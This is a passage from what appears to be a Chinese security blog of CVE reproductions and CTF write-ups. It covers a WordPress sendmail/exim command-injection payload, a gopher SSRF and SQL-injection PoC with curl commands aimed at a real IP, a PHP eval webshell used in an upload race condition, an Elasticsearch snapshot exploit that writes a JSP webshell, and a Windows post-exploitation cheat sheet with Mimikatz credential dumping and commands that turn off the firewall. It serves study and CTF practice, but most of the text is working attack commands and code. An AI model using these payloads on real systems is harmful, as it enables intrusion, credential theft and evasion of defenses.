$patternselect = &#x27;noregex&#x27;;                &#125;            &#125;        &#125;\n经过测试发现$patternselect变量被设置为pcre8，因此在函数后面执行如下代码中的pcre8的case\nswitch ($patternselect) &#123;          case &#x27;pcre8&#x27;:              ...          case &#x27;pcre&#x27;:              ...          case &#x27;html5&#x27;:              ...          case &#x27;noregex&#x27;:\t\t...          case &#x27;php&#x27;:          default:              ...      &#125;\npcre8的代码注释\n\nUses the same RFC5322 regex on which FILTER_VALIDATE_EMAIL is based, but allows dotless domains.\n\n基于php内置的邮箱验证的基础上做的修改\n\nphp Use PHP built-in FILTER_VALIDATE_EMAIL;\n\n查阅php官网\n![image-20221115091819538.png](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/1668523449643126528.png)\n这个验证方式允许使用括号或双引号使邮箱地址包含空格，因此在Hosts字段构造的发件人的邮箱可以是\ntarget(any -froot@localhost -be $&#123;run&#123;$payload&#125;&#125; null)@qq.com\n经过验证和过滤之后的函数调用\n$phpmailer=&gt;Send()\t\twp-includes/pluggable.php#471=&gt;postSend() \twp-includes/class-phpmailer.php#1125=&gt;mailSend()\twp-includes/class-phpmailer.php#1247=&gt;mailPassthru()\twp-includes/class-phpmailer.php#1368\n将payload传入到mailPassthru()函数中，函数代码如下\nprivate function mailPassthru($to, $subject, $body, $header, $params)   &#123;       //Check overloading of mail function to avoid double-encoding       if (ini_get(&#x27;mbstring.func_overload&#x27;) &amp; 1) &#123;           $subject = $this-&gt;secureHeader($subject);       &#125; else &#123;           $subject = $this-&gt;encodeHeader($this-&gt;secureHeader($subject));       &#125;       if (ini_get(&#x27;safe_mode&#x27;) || !($this-&gt;UseSendmailOptions)) &#123;           $result = @mail($to, $subject, $body, $header);       &#125; else &#123;           $result = @mail($to, $subject, $body, $header, $params);       &#125;       return $result;   &#125;\t\n由于没有开启安全模式，因此调用的是$result = @mail($to, $subject, $body, $header, $params);\n@mail是调用原生的mail()，在/wp-includes/class-phpmailer.php中定义\n/**    * Which method to use to send mail.    * Options: &quot;mail&quot;, &quot;sendmail&quot;, or &quot;smtp&quot;.    * @var string    */   public $Mailer = &#x27;mail&#x27;;\t/**    * The path to the sendmail program.    * @var string    */   public $Sendmail = &#x27;/usr/sbin/sendmail&#x27;;\n查阅php手册\nmail(    string $to,    string $subject,    string $message,    array|string $additional_headers = [],    string $additional_params = &quot;&quot;): bool\n对第五个参数有如下描述\n\nThe additional_params parameter can be used to pass  additional flags as command line options to the program configured to be used when sending mail, as defined by the sendmail_path configuration setting. For example, this can be used to set the envelope sender address when using sendmail with the -f sendmail option.\nThis parameter is escaped by escapeshellcmd() internally to prevent command execution. escapeshellcmd() prevents command execution, but allows to add additional parameters.  For security reasons, it is recommended for the user to sanitize this  parameter to avoid adding unwanted parameters to the shell command.\n‘additional_params’参数可用于将附加标志作为命令行选项传递给配置为在发送邮件时使用的程序，如’  sendmail_path ‘配置设置所定义的那样。例如，当使用带有’-f’  sendmail选项的sendmail时，可以使用它来设置信封发送者地址。\n该参数通过escapeshellcmd()在内部转义，以防止命令执行。escapeshellcmd()阻止命令的执行，但是允许添加额外的参数。出于安全考虑，建议用户对该参数进行消毒，以避免向shell命令添加不必要的参数。\n\n实际上phpmailer组件是调用linux系统命令sendmail进行邮件发送，命令格式为：sendmail -t -i -fusername@hostname\nmail() 执行后，会执行这样的指令 sendmail -t -i -fwordpress@过滤后的数据包头中的Host字段值\n另外sendmail符号链接到exim4，exim4的-be参数能开启字符串扩展测试模式，允许提取一些变量数据\n$tod_log返回系统时间，$spool_directory返回路径值/var/spool/exim4，因此可以用$&#123;substr&#123;10&#125;&#123;1&#125;&#123;$tod_log&#125;&#125;代替空格、$&#123;substr&#123;0&#125;&#123;1&#125;&#123;$spool_directory&#125;&#125;代替斜杠来绕过-be后面参数中空格和斜杠，以及run可以运行程序\n因此上面提到的payload\n因此上面提到的payload\ntarget(any -froot@localhost -be $&#123;run&#123;$payload&#125;&#125; null)\n最后变成\nsendmail -t -i -fwordpress@target(any -froot@localhost -be $&#123;run&#123;$payload&#125;&#125; null)\n这样就可以执行run中的命令\n如果直接在命令行里使用，需要给run加引号\n![image-20230829161640747](WordPress 远程命令执行漏洞复现(CVE-2018-15877)/image-20230829161640747.png)\n0x07 参考文章\nwordpress 4.6任意命令执行漏洞（PwnScriptum）复现\nWordPress &lt;= 4.6 命令执行漏洞(PHPMailer)(CVE-2016-10033)复现分析\n[WordPress 4.6 任意命令执行漏洞 (PwnScriptum)](https://wuxiuo.com/archives/83)\n深入分析WordPress4.6(PHPMailer)命令执行漏洞(CVE-2016-10033)\nWordpress 4.6 远程代码执行漏洞（PwnScriptum）\n","categories":["CVE漏洞"],"tags":["CVE系列"]},{"title":"攻防世界-checkInGame","url":"/2023/09/02/checkInGame/","content":"题目描述：\ncheckInGame\n题目解题：\n\n打开题目没啥信息，那看一下源码，发现有两个被注释掉的按钮，这里我也不知道如何利用。\n\n随后dirsearch扫了一下网站，没啥结果，这里也就没思路了，于是借鉴wp吧。\n看了wp发现是题目环境的问题，我这里显示的都是无权限访问js相关文件，而佬的环境是正常的。但 既然碰到了，咱们就跟着wp走一遍也可。\n本题是个js游戏，因为是前端页面，是使用js来实现的，那代码我们可以控制，而且可以调试。\n\n方法一：\nburpsuite抓包，burpsuite不对包进行处理。然后在浏览器中做游戏，等到40秒过完时，点击确定，页面不会刷新，可以继续做，直到解出flag。\n\n\n方法二：\n访问http://IP:POTRT/，点击F12，查看js代码。\n发现view.js初始化函数中有updateTime的属性，猜测是这个属性做了倒计时。\n\n在game.js中调用了这个属性。\n\n下载源码分析调试\nctrl+s下载源码\n\n修改js文件后缀，即删除.下载\n\n修改连连看.html中的js文件后缀，即删除.下载\n\n打开连连看.html,后发现图片没有正常显示，查看元素后，发现图片应该放在连连看.html同目录下img文件中。\n\n再次打开连连看.html，图片加载。\n\n修改game.js文件，注释掉this['updateTime'](); 这段代码，或删除掉这段代码\n\n可以看到倒计时停在40秒。\n\n做完连连看获取flag。\n\n得到flag：flag&#123;98fa8c29-5b70-5f30-36e4-ad006b259686&#125;\n参考文章：\n【愚公系列】2023年06月 攻防世界-Web（checkInGame）\n但这个文章只有一个方法，大家可以参考攻防世界的wp\n","categories":["攻防世界"]},{"title":"Elasticsearch写入webshell漏洞（WooYun-2015-110216）","url":"/2023/09/11/Elasticsearch%E5%86%99%E5%85%A5webshell%E6%BC%8F%E6%B4%9E%EF%BC%88WooYun-2015-110216%EF%BC%89/","content":"0x01 漏洞描述\nElasticSearch具有备份数据的功能，用户可以传入一个路径，让其将数据备份到该路径下，且文件名和后缀都可控。\n所以，如果同文件系统下还跑着其他服务，如Tomcat、PHP等，我们可以利用ElasticSearch的备份功能写入一个webshell。\n和CVE-2015-5531类似，该漏洞和备份仓库有关。在elasticsearch1.5.1以后，其将备份仓库的根路径限制在配置文件的配置项path.repo中，而且如果管理员不配置该选项，则默认不能使用该功能。即使管理员配置了该选项，web路径如果不在该目录下，也无法写入webshell。所以该漏洞影响的ElasticSearch版本是1.5.x以前。\n0x02 漏洞搭建\n编译与启动测试环境：\ndocker-compose builddocker-compose up -d\n简单介绍一下本测试环境。本测试环境同时运行了 Tomcat 和 ElasticSearch，Tomcat 目录在 /usr/local/tomcat，web 目录是 /usr/local/tomcat/webapps；ElasticSearch 目录在 /usr/share/elasticsearch。\n我们的目标就是利用 ElasticSearch，在 /usr/local/tomcat/webapps 目录下写入我们的 webshell。\n0x03 漏洞复现\n访问存在的漏洞页面：（9200一般为ElasticSearch的常用端口），此漏洞环境需要与tomcat结合使用，发现8080端口存在tomcat默认配置页面。\n\n发现9200端口存在elasticsearch页面：版本为1.5.1,确认存在漏洞\n\n测试流程\n首先创建一个恶意索引文档：\ncurl -XPOST http://ip:9200/yz.jsp/yz.jsp/1 -d&#x27; &#123;&quot;&lt;%new java.io.RandomAccessFile(application.getRealPath(new String(new byte[]&#123;47,116,101,115,116,46,106,115,112&#125;)),new String(new byte[]&#123;114,119&#125;)).write(request.getParameter(new String(new byte[]&#123;102&#125;)).getBytes());%&gt;&quot;:&quot;test&quot;&#125;&#x27;\n这里要用kali发送\n\n再创建一个恶意的存储库，其中 location 的值即为我要写入的路径。\n​\t\t园长：这个 Repositories 的路径比较有意思，因为他可以写到可以访问到的任意地方，并且如果这个路径不存在的话会自动创建。那也就是说你可以通过文件访问协议创建任意的文件夹。\n​\t\t这里我把这个路径指向到了 tomcat 的 web 部署目录，因为只要在这个文件夹创建目录 Tomcat 就会自动创建一个新的应用 (文件名为 wwwroot 的话创建出来的应用名称就是 wwwroot 了)。\ncurl -XPUT &#x27;http://ip:9200/_snapshot/yz.jsp&#x27; -d &#x27;&#123;     &quot;type&quot;: &quot;fs&quot;,     &quot;settings&quot;: &#123;          &quot;location&quot;: &quot;/usr/local/tomcat/webapps/wwwroot/&quot;,          &quot;compress&quot;: false     &#125;&#125;&#x27;\n\n存储库验证并创建:\ncurl -XPUT &quot;http://ip:9200/_snapshot/yz.jsp/yz.jsp&quot; -d &#x27;&#123;     &quot;indices&quot;: &quot;yz.jsp&quot;,     &quot;ignore_unavailable&quot;: &quot;true&quot;,     &quot;include_global_state&quot;: false&#125;&#x27;\n\n完成！\n前三步主要是创建一个snapshot-yz.jsp脚本向wwwroot下的test.jsp文件中写入任意字符串）\n访问 http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp，这就是我们写入的 webshell。\n\n该 shell 的作用是向 wwwroot 下的 test.jsp 文件中写入任意字符串，如：http://ip:8080/wwwroot/indices/yz.jsp/snapshot-yz.jsp?f=success。\n\n我们再访问 /wwwroot/test.jsp 就能看到 success 了：\n\n现在来写入一句话木马，哥斯拉生成一句话木马：\n生成jsp的shell：\n\n如上图进行配置生成木马。\n\nURL编码jsp的shell并在f=后输入改编码好的shell:\n\n\n访问test.jsp发现成功上传shell，直接哥斯拉连接一下\n\n\n点击测试连接发现成功，直接添加看看\n\n发现成功rce\n0x04 修复建议\n1、升级版本\n2、将repo目录权限设置为仅可读，不可写（自己建议的，仅在不影响业务的前提下）\n0x05 参考文章\n-wooyun-2015-110216 Elasticsearch写入webshell\n漏洞复现-wooyun-2015-110216-Elasticsearch写入webshell \nElasticsearch写入webshell漏洞（WooYun-2015-110216）\n","categories":["CVE漏洞"],"tags":["CVE系列"]},{"title":"攻防世界-babyweb","url":"/2023/09/03/babyweb/","content":"题目描述：\n国赛华东北-内网访问\n题目解题：\n\n进入页面没啥信息，抓包，扫目录均扫不到，之后又用acunetix扫了也没啥信息，因此没啥头绪了，开始借鉴wp。\n看了wp发现 竟然有个ssrf.php页面，但我的dir竟然没扫到。。。于是将其添加到了字典里\n那我们访问看看\n\n如上图我们先输入127.0.0.1看看\n\n发现进入了某个数据库页面，随后我随便输了几个查询语句，均会重定向到ssrf.php页面，这里又不知道 如何做了，看了wp发现他直接file协议读取了flag。。。看来我想复杂了\n使用文件读取协议：file:///flag\n\n看了官方wp后发现这似乎是非预期，官方采用gopher协议\n导致非预期解是因为：\npreg_match(&#x27;/file|http://|dict/i&#x27;, $url);\n\n正确的过滤方式应该是：\npreg_match(&#x27;/file|http:\\/\\/|dict/i&#x27;, $url);\n但这里我并不理解为何file能逃逸过去，GPT 回答如下\n与第一个正则表达式不同的是，这个正则表达式中的 &quot;http://&quot; 是带有转义斜杠 &quot;/&quot; 的。这意味着它只会匹配包含具体的字符串 &quot;http://&quot;，而不会匹配像 &quot;https://&quot; 或 &quot;http://example.com&quot; 这样的字符串。此外，它仍然匹配包含 &quot;file&quot; 或 &quot;dict&quot; 的字符串。\n这里我复现一下官方 wp\n然后就是ssrf+sql注入的考点，这个地方没有过多的过滤，主要考察的是mysql中取证能力给出一个可行的sleep() pocsleep延时注入爆破fake_flag表的第一个字母，其他的poc以此类推\npoc如下：gopher://127.0.0.1:80/_GET%20%2findex.php%253fquery%253Dselect%252520%25252a%252520from%252520fake_flag%252520where%252520if%252528mid%252528%252528select%252520flag%252520from%252520fake_flag%252520limit%2525200,1%252529,1,1%252529%25253D%252522t%252522,sleep%2525283%252529,0%252529%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250a\n在注入之后，会发现没有办法得到flag，这个时候需要去考虑到底是不是没有注入完全部的数据库\n因为database和show被过滤了，所以看不到其他数据库\n但是通过information_schema.processlist表格来查看正在运行的sql命令\n发现可疑数据库名：hintda91947e762d8c1d0d1b3d72d3369629\n然后访问da91947e762d8c1d0d1b3d72d3369629.php\n发现也是需要内网，而且提示\nyou need admin\n在输入框输入da91947e762d8c1d0d1b3d72d3369629\n发现回显了admin\n说明这个时候我们是管理员，\n然后就需要我们带着这个cookie去登录da91947e762d8c1d0d1b3d72d3369629.php页面\n所以我们最后的poc为\n输入密码打sql注入然后得到setcookie的值\ncurl -g -v http://39.105.136.196:30022/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_GET%2520%252findex.php%253fquery%253Dda91947e762d8c1d0d1b3d72d3369629%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250a\n得到返回的页面内容里面的set phpsessid\nru1n2mphovds3qosjg3n8o3661\n然后带着这个sessionid继续打\ncurl -g -v http://39.105.136.196:30022/ssrf.php?url=gopher%3A%2F%2F127.0.0.1%3A80%2F_GET%2520%252fda91947e762d8c1d0d1b3d72d3369629.php%20HTTP%2f1.1%250d%250aHost%3A%20localhost%250d%250aCookie%3A%20PHPSESSID%3Dru1n2mphovds3qosjg3n8o3661%3B%250d%250a\n但是这个过程有点懵\n参考文章：\n【愚公系列】2023年06月 攻防世界-Web（babyweb）\n","categories":["babyweb"]},{"title":"攻防世界-wzsc_文件上传","url":"/2023/09/03/wzsc_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","content":"题目描述：\n泰山杯\n题目解题：\n\n首先 上传了几个文件试试水 ，发现不论上传什么，他均会重定向到upload.php页面，于是我dir扫了一下，发现了 upload路由，访问看看\n\n这里 1.jpg是正常图片文件，也就是说，只有你上传的文件符合题目要求，那么该文件就会保存在该目录下，这里 有一个hint.txt文件\nÃ–_0 0vO Ow0 0w0 Ã–_0 Ã–_O Ã–.O o_o 0.O OvO o.0 owo o.Ã– Ã–.Ã– Ovo 0_Ã– Ã–_o owO O.0 owo Ã–_o owO O.0 owo Ã–_0 0wÃ– O.0 0w0 Ã–_0 OwO ov0 owo o_O O.Ã– Ã–vo \n里面 内容如上，不过不清楚是什么 加密，先搁着，参考wp发现他们 直接有了源码，那估计上述加密应该表达的是源文件所在处\n这里先进行审计\n&lt;?php    $allowtype = array(&quot;txt&quot;,&quot;jpeg&quot;,&quot;bmv&quot;,&quot;doc&quot;,&quot;docx&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;); //白名单    $size = 10000000;    $path = &quot;./upload/&quot;;    $filename = $_FILES[&#x27;file&#x27;][&#x27;name&#x27;];    if (is_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]))&#123;        if (!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;],$path.$filename))&#123;            exit();        &#125;       &#125; else &#123;        exit();    &#125;    $newfile = $path.$filename;    if ($_FILES[&#x27;file&#x27;][&#x27;error&#x27;] &gt; 0)&#123; //若上传的文件报错，则删除        unlink($newfile);        exit();    &#125;    $ext = array_pop(explode(&quot;.&quot;,$_FILES[&#x27;file&#x27;][&#x27;name&#x27;]));//若上传的文件后缀名不在白名单内，则删除    if (!in_array($ext,$allowtype))&#123;        unlink($newfile);        exit();    &#125;?&gt;\n这里也是 看了wp才知道可以利用竞争\n竞争原理：\n1.网站允许上传任意文件，然后检测文件中若有webshell，就删除文件；若不是指定类型文件，那么就使用unlink删除文件\n2.在删除之前访问上传的php文件，从而执行上传文件中的php代码\n上传代码如下\n&lt;?php fputs(fopen(&quot;shell.php&quot;, &quot;w&quot;), &#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;); ?&gt;\n这个木马的作用就是，写入另一个木马，因为即使我们将文件上传到服务器上，他也只会存在很短的时间，不能够让我们有足够的时间执行命令，就算你把命令直接写入了，也可能会存在题目不回显的情况，或者来不及回显的情况，所以最稳妥的就是要利用仅存的时间写入另一个不会被删除的木马\n先利用bp一直post那个文件\n\n当然不想手动也可以配合爆破模式 进行\nburpsuite重复发包\n将两个数据包调整为无负载，并一直持续攻击，注意抓包的线程要比上传包多\n\n\n注意线程数不要太低就行，接着运行py，同时开始爆破\n使用burp suite配合脚本进行竞争\n脚本如下：\nimport requestsimport threadingimport os class RaceCondition(threading.Thread):    def __init__(self):        threading.Thread.__init__(self)         self.url = &#x27;http://61.147.171.105:62431/upload/a.php&#x27;        self.uploadUrl = &#x27;http://61.147.171.105:62431/upload/shell.php&#x27;     def _get(self):        print(&#x27;try to call uploaded file...&#x27;)        r = requests.get(self.url)        if r.status_code == 200:            print(&#x27;[*] create file shell.php success.&#x27;)            os._exit(0)     def _upload(self):        print(&#x27;upload file...&#x27;)        rs = requests.get(self.uploadUrl)        if rs.status_code == 200:            print(&#x27;[*] create file shell.php success.&#x27;)            os._exit(0)     def run(self):        while True:            for i in range(5):                self._get()             for i in range(10):                self._upload()                self._get() if __name__ == &#x27;__main__&#x27;:    threads = 50     for i in range(threads):        t = RaceCondition()        t.start()     for i in range(threads):        t.join()\n\n\n上传成功，蚁剑连接得到flag\n\n这里还有一个方法\na.php上传为：\n&lt;?php show_source(&#x27;../flag.php&#x27;);?&gt;\n这里php直接show_source包含flag.php就不用写shell啦。\n最终看了题目自带的wp也没发现那个hint.txt的作用，并且那个源码也不是做题时可以看到的，因此条件竞争完全是靠自己的尝试\n参考文章：\n【愚公系列】2023年06月 攻防世界-Web（wzsc_文件上传）\n文件上传之条件竞争\n","categories":["攻防世界"]},{"title":"内网渗透学习-Windows信息搜集篇-持续更新","url":"/2023/09/03/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E5%AD%A6%E4%B9%A0-Windows%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E7%AF%87/","content":"当我们通过渗透进入内网环境后，面对的是一片未知区域。需要对当前机器角色判断，对机器所处区域分析。\n判断机器所处于网络拓扑哪个区域，是在DMZ区、办公区、核心区。区域界限是相对的\n0x01 机器角色判断\n\n文件服务器：配合社工，生成payload捆绑到文件服务器公用文件上，可批量上线主机\nDNS服务器：端口53，可通过DNS服务器获取内网web系统信息，或者探测域信息\nDHCP服务器：查看内网多组网段信息，更多的获取拓补信息\n开发测试服务器：获取源码，新的信息资产，多存在弱口令\n代理服务器：获取服务器账号，拿到各种密码\nweb服务器：可能需要提权(一般接触到的环境)\n个人PC：查看是否存在域环境\n\n0x02 本机信息收集\n包括操作系统、权限、内网IP段、杀软、端口、服务、补丁情况、网络连接、共享、会话等。如果是域内主机，那么操作系统、应用软件、补丁、服务、杀软一般都是批量安装的。文件共享/FTP连接记录、浏览器访问记录、mstsc连接记录、ssh连接记录。\n\n如果由于使用了x86的shell无法使用命令，需要在命令前加上c:\\windows\\sysnative，这样就能执行x64的命令了。\n\n2.1 查看主机名\nhostname\n\n2.2 查看版本\nver\n\n2.3 查看所有环境变量\nset\n\n2.4 查看安装驱动\nDRIVERQUERY\n\n2.5 查看操作系统信息\n2.5.1 架构\nwmic os get osarchitecture\n\n2.5.2 系统名\nwmic os get caption\n\n2.6 查看逻辑盘\nwmic logicaldisk get caption\n\n2.7 本机网络配置\nipconfig /all - ip地址信息\n\nnetstat -ano - 端口信息\n\narp -a - arp记录信息\n\n2.8 查看当前系统版本\ntip：wmic命令\n顺便了解一下wmic命令作用\nWMIC（Windows Management Instrumentation Command-line）是Windows操作系统中的一个命令行实用程序，用于执行各种系统管理任务和查询系统信息。通过WMIC，用户可以在命令行中执行各种WMI（Windows Management Instrumentation）操作，包括查询系统信息、管理进程、服务、网络设置等。 WMIC提供了丰富的命令\nwmic OS get Caption,CSDVersion,OSArchitecture,Version\n\n2.9 查看体系结构\necho %PROCESSOR_ARCHITECTURE%\n\n2.10 查询操作系统及软件信息\nsysteminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; ## 英文系统\nsysteminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot; ## 中文系统\n\n这里不知为何打不开，找了几篇文章，感觉是环境变量的问题，设置了之后又发现语法错误，双引号是中文版的。。。，好在最后成功了，且为中文系统\n\n2.11 查看.net framework版本\nreg query &quot;HKLM\\Software\\Microsoft\\NET Framework Setup\\NDP&quot; /s /v version | findstr /i version | sort /+26 /r\n\n2.12 查看补丁列表\nsysteminfo\n\n2.13 查看补丁的名称、描述、ID、安装时间等\nwmic qfe get Caption,Description,HotFixID,InstalledOn\n\n2.14 PowerShell收集软件的版本信息\npowershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name, version&quot;\n\n2.15 查看安装的软件的版本、路径等\nwmic product get name, version\n\n查看软件比较靠谱的做法是远程加载本地ps文件，cs中可以使用powershell-import,上传ListInstallProgram.ps1后输入\npowershell Get-list\n将文件放到靶机，本地加载也可以\nshell powershell -exec bypass -Command &quot;&amp; &#123;Import-Module &#x27;C:\\Users\\HackerQWQ\\Desktop\\ListInstalledProgram.ps1&#x27;;Get-list&#125;&quot;\n这里尝试了半天，不知道从哪下手，还是对cs不熟悉，之后深入学习慢慢搞\n2.16 查看当前用户权限\nwhoami &amp;&amp; whoami /priv\n\n2.17 查询本机服务信息\nwmic service list brief\n\n2.18 查看开启的服务\nnet start\n\n2.19 wmic查询进程信息\nwmic process list brief\n\n2.20 查看进程\ntasklist /svc\n\n2.21 查看启动程序信息\nwmic startup get command,caption\n\n2.22 查看计划任务(需要高权限)\nat（win10之前）\nchtasks /query /fo LIST /v（win10之后）\n\n2.23 查看主机开机时间\nnet statistics workstation\n\n2.24 查看本机用户列表\nnet user\n\n2.25 获取本地管理员信息\nnet localgroup administrators\n\n2.26 查看当前在线用户\nquery user || qwinsta\n\n2.27 查看在线用户\nquser\n\n2.28 列出断开本地计算机与所连接的客户端的对话(需要高权限)\nnet session\n\n2.29 查询端口列表\nWindows: netstat -ano\nlinux: netstat -tnlp\n\n\n2.30 查看本机共享列表和可访问的域共享列表\nnet share （445端口）\n\n2.31 查找共享列表\nwmic share get name,path,status\n\n2.32 磁盘映射\nnet use k: \\192.168.1.10\\c$\n这里不太懂，没搞出来\n2.33 查询路由表\nroute print\n\n可用接口的ARP缓存表。局域网内arp -a，查看是否有重复的mac地址，判断是否存在arp欺骗。服务器绑定mac地址方式防止arp欺骗\narp -a\n\n2.34 查看远程连接信息\ncmdkey /l\n\n2.35 查看杀软\nWMIC /Node:localhost /Namespace:\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n暂时没有\n2.36 查看本地密码策略\nnet accounts\n\n2.37 查看hosts文件：\nlinux:cat /etc/hosts\nwindows:type c:\\Windows\\system32\\drivers\\etc\\hosts\n\n2.38 查看dns缓存\nipconfig /displaydns\n\n\n列举安装的软件\nListInstalledProgram项目地址:https://github.com/3gstudent/ListInstalledPrograms\n\n\n自动信息收集\n我们可使用自动化脚本WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）。在默认情况下，任何版本的Windows XP的低权限用户不能访问WMIC，Windows 7以上版本的低权限用户允许访问WMIC并执行相关操作。 执行后，会将信息收集的结果写入HTML文档。\n项目地址：http://www.fuzzysecurity.com/scripts/files/wmic_info.rar\n\n\n\n获取主机信息也可以用Seatbelt.exe，项目地址：https://github.com/GhostPack/Seatbelt/tree/master，需要编译，放到靶机上执行下列命令\nshell Seatbelt.exe -group=all &gt; env.txt\n最好先免杀一下，不然360会一直警告,cs上的插件也有集成Seatbelt，可以直接使用插件   --这里等学了免杀在搞吧\n\n2.39 常见查毒软件进程\ntasklist /svc\n随后将结果放到avList中对比查看\n\n\n\n进程\n软件名称\n\n\n\n\n360SD.EXE\n360杀毒\n\n\n360TRAY.EXE\n360实时保护\n\n\nZHUDONGFANGYU.EXE\n360主动防御\n\n\nKSAFETRAY.EXE\n金山卫士\n\n\nSAFEDOGUPDATECENTER.EXE\n服务器安全狗\n\n\nMCAFEE MCSHIELD.EXE\n迈克菲杀毒软件\n\n\nEGUI.EXE\nNOD32\n\n\nAVP.EXE\n卡巴斯基\n\n\nAVGUARD.EXE\n小红伞\n\n\nBDAGENT.EXE\nBITDEFENDER\n\n\n\n可以用avList自动判断,项目地址:https://github.com/gh0stkey/avList\n\n2.40 浏览器信息收集\n项目地址：https://github.com/moonD4rk/HackBrowserData\n\n0x03 域环境信息收集\n3.1 判断是否存在域\nipconfig /all 可查看网关IP地址、DNS的IP地址、域名、本机是否和DNS服务器处在同一网段等。\n\n3.2 解析域名ip\n通过反向解析查询命令nslookup来解析域名的IP地址，用解析到的IP地址进行对比，判断域控服务器和DNS服务器是否在同一台机器上\nnslookup hacker.testlab(这里写自己的域控制服务器域名)\n\n3.3 查看当前权限\nwhoami\n\n3.4 获取域SID\nwhoami /all\n\n3.5 查询指定用户的详情信息\nnet user xxx /domain\n\n3.6 查看域内所有账号\nnet user /domain\n\n3.7 对比查看”域(域名)”和”登录服务器(域控制器)”的信息是否匹配\nsysteminfo\n域名\n\n域控制器\n\n3.8 对比查看”工作站域DNS名称(域名)”和”登录域(域控制器)”的信息是否相匹配\nnet config workstation\t\n\n3.9 查看时间可以找到域控\nnet time /domain\n\n3.10 查看域密码策略\nnet accounts /domain\n\n3.11 查看当前登录域\nnet config workstation\n\n3.12 登录本机的域管理员\nnet localgroup administrators /domain\n\n3.13 获取域控ip\nping -a xxx.com\n\n3.14 查询域\nnet view /domain\n\n3.15 查询域内的所有计算机\nnet view /domain:HACKER\n\n3.16 查询域的所有组（enterprise admins组权限最大）\nnet group /domain\n\n3.17 SPN扫描\nsetspn -T domain -q /\n\n这里我估计应该是没有spn吧\n3.18 查看域管理员的用户组\nnet group “domain admins” /domain\n\n3.19 查询域系统管理员用户组\nnet group &quot;Enterprise admins&quot; /domain\n\n3.20 查看域控制器\nnet group &quot;domain controllers&quot; /domain\n\n3.21 查看域控制器的机器名\nnltest /DCLIST:hacker\n\n3.22 查看dns缓存\nipconfig /displaydns\n\n3.23 列域控c盘文件(需要域管理员权限)\ndir \\\\WIN7-TEST.hacker.testlab\\c$\n这里不知为何我找不到指定的文件，或许是命令错误，找了半天发现是域名前面应该是两条反斜杠\n\n3.24 查询所有域成员计算机列表\nnet group &quot;domain computers&quot; /domain\n\n3.25 获取域信任信息\nnltest /domain_trusts\n\n3.26 获取域内用户的详细信息\nwmic useraccount get /all\n\n3.27 查看存在的用户\ndsquery user\n\n这条命令只能在winserver服务器才能使用\n3.28 查询所有计算机名称\ndsquery computer\n\n3.29 攻击主机CMD扫描同网段存活ip\nwindows\n# 扫c段for /L %P in (1,1,254) DO @ping ‐w 1 ‐n 1 192.168.17.%P | findstr &quot;TTL =&quot;\nLinux\n#!/bin/bashNET=10.168.1.for IP in &#123;100..115&#125;doif `ping -c2 -i0.2 -w2 $NET$IP &amp;&gt; /dev/null`then echo -e &quot;$NET$IP is \\033[31mup\\033[0m&quot; else echo -e &quot;$NET$IP is \\033[32mdown\\033[0m&quot; fidone\n扫b段\nfor i in 192.168.&#123;1..254&#125;.&#123;1..254&#125;; do if ping -c 3 -w 3 $i &amp;&gt;/dev/null;then echo $i is alived; fi; done\n3.30 PowerView.ps域内信息收集\nInvoke-NetView //查域内环境\nInvoke-ShareFinder //查共享目录\nInvoke-MapDomainTrusts //查看域内信任关系\nGet-NetLocalGroup -HostName TARGET(主机名) //查看指定用户的登录时间、所属组情况\n3.31 cs信息收集\ntarget组信息的命令\nnet group \\Target\nnet localgroup \\target 组名\n获取远程目录\nshell dir \\target\\c$\nshell dir /S /B \\target\\c$\\users //递归获取多级目录及文件\ncs通过powershell命令获取目录信息\npowersehll Invoke-Command -ComputerName target -ScriptBlock{dir c:}\npowershell Invoke-Command -ComputerName target -ScriptBlock{net localgroup administrators}\ncs通过mimikatz抓取远程哈希值\npowershell-import Invoke-Mimikatz.ps1\npowershell Invoke-Mimikatz -DumpCreds\npowershell Invoke-Mimikatz -Command ‘“privilege::debug” “sekurlsa::logonPasswords full”‘\n3.32 防火墙相关\n\n\n关闭防火墙\nWindows Server 2003及之前的版本(admin)：\nnetsh firewall set opmode disable\nWindows Server 2003之后的版本(admin)：\nnetsh advfirewall set allprofiles state off\n\n\n查看防火墙配置：\nnetsh firewall show config\n\n\n\n\n\n修改防火墙配置\nWindows Server 2003及之前的版本，允许指定程序全部连接：\nnetsh firewall add allowedprogram c:\\nc.exe &quot;allow nc&quot; enable\nWindows Server 2003之后的版本，情况如下。\n允许指定程序进入：\nnetsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C:\\nc.exe&quot;\n允许指定程序退出：\nnetsh advfirewall firewall add rule name=&quot;Allow nc&quot; dir=out action=allow program=&quot;C:\\nc.exe&quot;\n允许3389端口放行：\nnetsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow\n自定义防火墙日志的储存位置\nnetsh advfirewall set currentprofile logging filename &quot;C:\\windows\\temp\\fw.log&quot;\n\n\n3.33 查询代理配置情况\nreg query &quot;HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings&quot;\n\n3.34 查询并开启远程连接服务\n\n\n查看远程连接端口\n0xd3d转换后就是3389\nREG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /V PortNumber\n\n\n在Windows Server 2003中开启3389端口\n\n\nwmic path win32_terminalservicesetting where (__CLASS !=&quot;&quot;)  call setallowtsconnections 1\n\n在Windows Server 2008和Windows Server 